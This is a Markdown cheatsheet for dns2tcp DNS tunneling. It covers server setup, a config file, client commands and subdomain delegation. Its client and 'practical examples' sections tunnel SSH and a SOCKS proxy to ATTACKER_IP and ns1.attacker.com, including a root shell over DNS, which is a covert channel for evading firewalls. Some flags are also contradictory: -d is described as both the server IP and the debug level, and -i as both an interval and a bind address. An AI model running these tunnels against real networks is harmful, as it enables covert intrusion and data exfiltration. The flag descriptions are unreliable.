---
title: "dns2tcp CHEATSHEET"
description: "Quick reference for dns2tcp DNS tunneling commands"
---

# dns2tcp CHEATSHEET

## Server

```bash
# Start server with config
dns2tcp -f /etc/dns2tcpd.conf -i 0.0.0.0 -p 53

# Start with debug
dns2tcp -f /etc/dns2tcpd.conf -i 0.0.0.0 -p 53 -d 3
```

## Configuration File

```
# /etc/dns2tcpd.conf
listen = 0.0.0.0
port = 53
domain = tunnel.example.com
key = secretkey
resources = ssh:127.0.0.1:22, web:127.0.0.1:80
forward = yes
```

## Client

```bash
# Basic connection
dns2tcp -r ssh -k secretkey -d ATTACKER_IP -p 53

# With local port
dns2tcp -r ssh -k secretkey -d ATTACKER_IP -p 53 -l 127.0.0.1:2222

# SSH through tunnel
ssh -p 2222 user@127.0.0.1

# HTTP through tunnel
dns2tcp -r web -k secretkey -d ATTACKER_IP -p 53 -l 127.0.0.1:8080
```

## Record Types

```bash
dns2tcp -r ssh -k key -d ATTACKER_IP -t TXT     # TXT records
dns2tcp -r ssh -k key -d ATTACKER_IP -t NULL     # NULL records
dns2tcp -r ssh -k key -d ATTACKER_IP -t ANY      # ANY records
```

## DNS Server Setup

```bash
# Delegate subdomain to your server
# In your DNS provider's control panel:
# Add NS record: tunnel.example.com -> ns1.attacker.com
# Add A record: ns1.attacker.com -> ATTACKER_IP

# Verify delegation
dig ns tunnel.example.com
```

## Common Flags

| Flag | Description |
|------|-------------|
| `-f FILE` | Configuration file |
| `-r RESOURCE` | Resource to connect to |
| `-k KEY` | Shared secret key |
| `-d SERVER` | DNS server IP |
| `-p PORT` | DNS port |
| `-l LOCAL:PORT` | Local port to bind |
| `-t TYPE` | DNS record type (TXT, NULL, ANY) |
| `-T` | Use TCP DNS |
| `-i SECS` | Query interval |
| `-d LEVEL` | Debug level |

## Practical Examples

```bash
# SSH tunnel through DNS
# Server
dns2tcp -f /etc/dns2tcpd.conf -i 0.0.0.0 -p 53

# Client
dns2tcp -r ssh -k MySecretKey -d ns1.tunnel.example.com -l 127.0.0.1:2222
ssh -p 2222 root@127.0.0.1

# Interactive shell through DNS
dns2tcp -r ssh -k MySecretKey -d ns1.tunnel.example.com -l 127.0.0.1:2222
ssh -D 1080 -p 2222 root@127.0.0.1
```

## Troubleshooting

```bash
# Test DNS resolution
dig tunnel.example.com

# Check if port 53 is in use
sudo ss -tlnp | grep :53

# Kill existing DNS service
sudo systemctl stop systemd-resolved
sudo fuser -k 53/udp
```
